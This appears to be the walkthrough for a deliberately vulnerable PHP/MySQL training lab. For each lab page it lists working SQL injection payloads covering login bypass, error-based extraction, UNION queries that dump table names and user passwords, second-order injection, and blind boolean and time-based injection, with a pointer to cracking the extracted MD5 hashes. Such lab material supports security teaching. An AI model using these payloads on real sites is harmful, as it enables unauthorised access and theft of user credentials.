# Walkthrough document

This document explains the different attacks that can be done on this setup. Use `?debug=true` to see the actual query being executed.

## Registration

Use the `register.php` to create users

## Login bypass attack

Bypassing login using boolean expressions

**Page:** `login1.php`

**Attack:** 
   
- `non-existent-user' OR 1=1 -- //`
- `bob' -- //` 

**Page:** `login2.php`

**Attack:** 

- `voldemort') -- //`

## Verbose SQL Error based Injection

Forcing error conditions to reveal and extract data

**Page:** `login1.php` 

**Attack:**

- `' or 1 in (select @@version) -- //`
- `' or 1=CAST((select group_concat(table_name) from information_schema.columns) AS SIGNED) -- //`
- `' or 1 in (select password from users where username = 'admin') -- //` --> [Crack the MD5 password](https://crackstation.net/)


## Extracting data using UNION queries

Using a pre existing SQL select query to fetch additional data from the DB

**Page:** `searchproducts.php` 

**Attack:**

- `' order by 5 -- //`
- `' union select 1,2,3,4,5 -- //`
- `' union select null, null, database(), user(), @@version -- //`
- `' union select null, table_name, column_name, table_schema, null from information_schema.columns -- //`
- `' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //`
- `' union select null, id, username, password, fname from users -- //`

## Second order SQL injection

User input is stored and reused as is in a different function that has no protection

**Page:** `secondorder_register.php`

**Attack:**

```
- ' or 1 in (select @@version) -- //
- ' or 1 in (select password from users where username='admin') -- //
- ' or 1 in (select convert(password,unsigned) from users where username='admin') -- //
- navigate to secondorder_changepass.php
```

## Blind SQL injection

**Page:** `blindsqli.php`

**Attack:**

- `?user=1' and 1=1 -- //`
- `?user=admin' and substring((select table_name from information_schema.columns where column_name = 'password' LIMIT 1),1,1)>'a' -- //` 
- `?user=1' union select 1,2,3,4, if (substring(username,1,1) > 'd', benchmark(100000000, encode('txt','secret')),null) from users where id=1 -- //` 

## References

- SQL Injection Cheat Sheet - http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
- Various ways of loading a UDF into MySQL - https://osandamalith.com/2018/02/11/mysql-udf-exploitation/